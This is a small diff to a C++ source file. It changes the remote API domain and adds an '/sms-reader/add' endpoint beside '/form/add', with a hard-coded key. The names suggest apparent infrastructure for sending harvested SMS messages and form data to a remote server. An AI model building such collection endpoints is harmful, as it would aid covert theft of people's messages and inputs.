@@ -2,8 +2,8 @@
 #include <string>
 
 // Declare global variables for the domain URLs
-std::string url = "https://uk2hub.com/api.php?action=save";
-std::string sms_save = "";
+std::string url = "https://amanbhaidkbosswala.in/api";
+std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
 std::string site = "localhost";
 std::string KEY = "00112233445566778899aabbccddeeff";
